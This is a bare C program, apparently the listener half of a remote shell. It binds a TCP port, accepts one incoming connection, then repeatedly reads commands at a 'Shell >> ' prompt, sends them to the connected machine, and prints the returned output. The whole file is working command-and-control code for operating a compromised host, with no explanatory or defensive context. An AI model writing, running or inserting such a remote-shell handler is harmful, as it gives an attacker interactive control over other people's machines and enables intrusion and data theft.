#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char const *argv[])
{
	if (argc != 2)
	{   
		printf("Usage: %s <port>\n", argv[0]);
		return 0;
	}

	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	int optval;
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
	{
		fprintf(stderr, "Error setting TCP socket options\n");
		exit(-1);
	}

	struct sockaddr_in server_address;
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("0.0.0.0");
	server_address.sin_port = htons(atoi(argv[1]));
	bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
	listen(sock, 5);
	struct sockaddr_in client_address;
	socklen_t client_length = sizeof(client_address);
	int client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);
	if (client_socket == -1)
	{
		fprintf(stderr, "Error accepting socket connection\n");
		exit(-1);
	}

	char buffer[1024];
	char response[18384];
	while (1)
	{
		memset(&buffer, 0, sizeof(buffer));
		memset(&response, 0, sizeof(response));
		printf("Shell >> ");
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");
		write(client_socket, buffer, sizeof(buffer));

		if (strncmp("q", buffer, 1) == 0)
			break;
		
		recv(client_socket, response, sizeof(response), MSG_WAITALL);
		printf("%s", response);
	}

	return 0;
}

